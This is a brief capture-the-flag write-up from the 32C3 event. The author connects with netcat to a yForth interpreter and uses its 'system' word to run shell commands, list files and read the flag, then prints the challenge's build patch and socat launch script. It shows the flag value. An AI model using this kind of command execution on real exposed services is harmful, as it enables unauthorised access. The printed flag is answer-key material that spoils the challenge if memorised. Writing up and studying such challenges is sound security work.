The challenge has us connect to 136.243.194.49 on port 1024:


```
$ nc 136.243.194.49 1024
yForth? v0.2  Copyright (C) 2012  Luca Padovani
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions; see LICENSE for details.
```

Seeing that it's a Forth environment, I immediately look up system command syntax:

http://rosettacode.org/wiki/Execute_a_system_command#Forth

and continue:

```
s" ls" system
flag.txt  README.gpl  run.sh  yforth
ok
s" cat flag.txt" system 
32C3_a8cfc6174adcb39b8d6dc361e888f17b
ok
```

The flag has been grabbed and points awarded.  Just for fun I decided to explore a bit more:

```
s" cat README.gpl" system
This challenge is based on yForth 0.2.1, available at
ftp://ftp.debian.org/debian/pool/main/y/yforth/yforth_0.2.1.orig.tar.gz
with a SHA1 sum of 49f5cdb773438a98b03578160e591265e8b63215.

------------------------------------patch------------------------------------
diff -ru orig/yforth-0.2.1/config.h yforth-0.2.1/config.h
--- orig/yforth-0.2.1/config.h	2012-10-11 07:06:31.000000000 +0200
+++ yforth-0.2.1/config.h	2015-07-29 04:27:24.022634049 +0200
@@ -28,26 +28,26 @@
 #include <endian.h>
 
 #define COREE_DEF           1L
-#define DOUBLE_DEF          1L
-#define DOUBLEE_DEF         1L
-#define FLOAT_DEF           1L
-#define FLOATE_DEF          1L
-#define MEMALL_DEF          1L
+#define DOUBLE_DEF          0L
+#define DOUBLEE_DEF         0L
+#define FLOAT_DEF           0L
+#define FLOATE_DEF          0L
+#define MEMALL_DEF          0L
 #define MEMALLE_DEF         0L
-#define SEARCH_DEF          1L
-#define SEARCHE_DEF         1L
+#define SEARCH_DEF          0L
+#define SEARCHE_DEF         0L
 #define TOOLS_DEF           1L
 #define TOOLSE_DEF          1L
-#define LOCALS_DEF          1L
-#define LOCALSE_DEF         1L
-#define FACILITY_DEF        1L
+#define LOCALS_DEF          0L
+#define LOCALSE_DEF         0L
+#define FACILITY_DEF        0L
 #define FACILITYE_DEF       0L
-#define BLOCK_DEF           1L
-#define BLOCKE_DEF          1L
-#define EXCEPTION_DEF       1L
+#define BLOCK_DEF           0L
+#define BLOCKE_DEF          0L
+#define EXCEPTION_DEF       0L
 #define EXCEPTIONE_DEF      0L
-#define FILE_DEF            1L
-#define FILEE_DEF           1L
+#define FILE_DEF            0L
+#define FILEE_DEF           0L
 #define STRING_DEF          1L
 #define STRINGE_DEF         0L
 
diff -ru orig/yforth-0.2.1/Makefile yforth-0.2.1/Makefile
--- orig/yforth-0.2.1/Makefile	2012-10-11 07:06:31.000000000 +0200
+++ yforth-0.2.1/Makefile	2015-07-29 18:10:00.102640484 +0200
@@ -1,4 +1,9 @@
-CC = gcc
+default: yforth
+
+run: yforth
+	socat TCP-LISTEN:9090,fork,reuseaddr EXEC:./yforth,echo=0,pty,stderr
+
+CC = gcc -m32
 MATHLIB = -lm
 
 OBJECTS = block.o blocke.o core.o coree.o double.o doublee.o exceptio.o \
@@ -15,12 +20,12 @@
 	$(CC) -o yforth $(LDFLAGS) $(OBJECTS) $(MATHLIB)
 
 div.h: div
-	./div 
+	./div > $@
 	
 div: division.c
 	$(CC) -o div $(CFLAGS) $(CPPFLAGS) division.c
 
-.c.o: 	 
+.c.o: 	 config.h
 	$(CC) -c -o $@ $(CFLAGS) $(CPPFLAGS) $<
 
 clean:
---------------------------------end-of-patch--------------------------------
ok
s" cat run.sh" system
#!/bin/sh
exec socat TCP-LISTEN:1024,fork,reuseaddr EXEC:./yforth,echo=0,pty,stderr
ok
```

And the yforth file was, predictably, a binary.
